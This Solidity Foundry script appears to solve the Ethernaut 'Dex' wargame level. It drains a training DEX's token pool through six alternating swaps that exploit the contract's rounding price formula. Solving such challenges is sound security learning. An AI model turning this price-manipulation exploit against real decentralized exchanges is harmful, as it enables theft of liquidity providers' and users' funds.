// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "instances/22_Dex.sol";

contract AttackerDexScript is Script {
    Dex dex = Dex(vm.envAddress("INSTANCE"));
    address token1;
    address token2;

    function toksLog() internal view {
        console.log("token1 msg.sender", SwappableToken(token1).balanceOf(msg.sender));
        console.log("token2 msg.sender", SwappableToken(token2).balanceOf(msg.sender));
        console.log("token1        dex", SwappableToken(token1).balanceOf(address(dex)));
        console.log("token2        dex", SwappableToken(token2).balanceOf(address(dex)));
    }

    function run() external {
        vm.startBroadcast();

        token1 = dex.token1();
        token2 = dex.token2();

        dex.approve(address(dex), 100);

        toksLog();
        dex.swap(token1, token2, 10);
        dex.swap(token2, token1, 20);
        dex.swap(token1, token2, 24);
        dex.swap(token2, token1, 30);
        dex.swap(token1, token2, 41);
        dex.swap(token2, token1, 45);
        toksLog();

        vm.stopBroadcast();
    }
}
